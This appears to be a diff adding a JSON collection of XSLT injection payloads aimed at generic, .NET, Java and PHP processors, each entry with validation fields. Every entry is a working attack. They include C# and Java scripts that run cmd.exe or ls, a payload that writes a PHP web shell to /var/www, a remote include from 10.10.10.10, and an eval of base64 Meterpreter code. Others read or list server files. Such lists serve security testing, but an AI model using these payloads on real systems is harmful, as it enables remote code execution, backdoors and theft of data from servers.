@@ -1,0 +1,134 @@
+[
+  {
+    "payload_id": "OWP-51215",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\r\n<body>\r\n<br />Version: <xsl:value-of select=\"system-property('xsl:version')\" />\r\n<br />Vendor: <xsl:value-of select=\"system-property('xsl:vendor')\" />\r\n<br />Vendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" />\r\n</body>\r\n</html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51216",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<xsl:stylesheet\r\n        xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\r\n    xmlns:exploit=\"http://exslt.org/common\"\r\n    extension-element-prefixes=\"exploit\"\r\n    version=\"1.0\">\r\n<xsl:template match=\"/\">\r\n\r\n<exploit:document href=\"evil.txt\" method=\"text\">\r\n        Hello World!\r\n</exploit:document>\r\n\r\n</xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51217",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": ".NET",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\r\nxmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\r\nxmlns:user=\"urn:my-scripts\">\r\n\r\n<msxsl:script language = \"C#\" implements-prefix = \"user\">\r\n<![CDATA[\r\npublic string execute(){\r\nSystem.Diagnostics.Process proc = new System.Diagnostics.Process();\r\nproc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\";\r\nproc.StartInfo.RedirectStandardOutput = true;\r\nproc.StartInfo.UseShellExecute = false;\r\nproc.StartInfo.Arguments = \"/c dir\";\r\nproc.Start();\r\nproc.WaitForExit();\r\nreturn proc.StandardOutput.ReadToEnd();\r\n}\r\n]]>\r\n</msxsl:script>\r\n\r\n  <xsl:template match=\"/fruits\">\r\n  --- BEGIN COMMAND OUTPUT ---\r\n\t<xsl:value-of select=\"user:execute()\"/>\r\n  --- END COMMAND OUTPUT ---\t\r\n  </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51218",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": ".NET",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:App=\"http://www.tempuri.org/App\">\r\n    <msxsl:script implements-prefix=\"App\" language=\"C#\">\r\n      <![CDATA[\r\n        public string ToShortDateString(string date)\r\n          {\r\n              System.Diagnostics.Process.Start(\"cmd.exe\");\r\n              return \"01/01/2001\";\r\n          }\r\n      ]]>\r\n    </msxsl:script>\r\n    <xsl:template match=\"ArrayOfTest\">\r\n      <TABLE>\r\n        <xsl:for-each select=\"Test\">\r\n          <TR>\r\n          <TD>\r\n            <xsl:value-of select=\"App:ToShortDateString(TestDate)\" />\r\n          </TD>\r\n          </TR>\r\n        </xsl:for-each>\r\n      </TABLE>\r\n    </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51219",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Java",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\r\n  <xsl:template match=\"/\">\r\n    <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>\r\n    <xsl:variable name=\"process\" select=\"rt:exec($rtobject,'ls')\"/>\r\n    <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/>\r\n    <xsl:value-of select=\"$processString\"/>\r\n  </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51220",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Java",
+    "injection_point": "body_xml",
+    "payload_string": "<xml version=\"1.0\"?>\r\n<xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\">\r\n<xsl:template match=\"/\">\r\n<xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/>\r\n</xsl:template>.\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51221",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\r\n<body style=\"font-family:Arial;font-size:12pt;background-color:#EEEEEE\">\r\n    <xsl:variable name=\"payload\">\r\n        include(\"http://10.10.10.10/test.php\")\r\n    </xsl:variable>\r\n    <xsl:variable name=\"include\" select=\"php:function('assert',$payload)\"/>\r\n</body>\r\n</html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51222",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\r\n  <xsl:template match=\"/\">\r\n    <xsl:value-of select=\"php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')\" />\r\n  </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51223",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\r\n<body>\r\n<xsl:value-of select=\"php:function('readfile','index.php')\" />\r\n</body>\r\n</html>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51224",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\r\n  <xsl:template match=\"/\">\r\n    <xsl:variable name=\"eval\">\r\n      eval(base64_decode('Base64-encoded Meterpreter code'))\r\n    </xsl:variable>\r\n    <xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/>\r\n  </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51225",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\">\r\n  <xsl:template match=\"/\">\r\n    <xsl:value-of name=\"assert\" select=\"php:function('scandir', '.')\"/>\r\n  </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-51227",
+    "vulnerability_category": "Injection (XSLT)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\r\n<xsl:template match=\"/\">\r\n<p>\r\nVersion: <xsl:value-of select=\"system-property('xsl:version')\" /> <br />\r\nVendor: <xsl:value-of select=\"system-property('xsl:vendor')\" /> <br />\r\nVendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" />\r\n</p>\r\n</xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
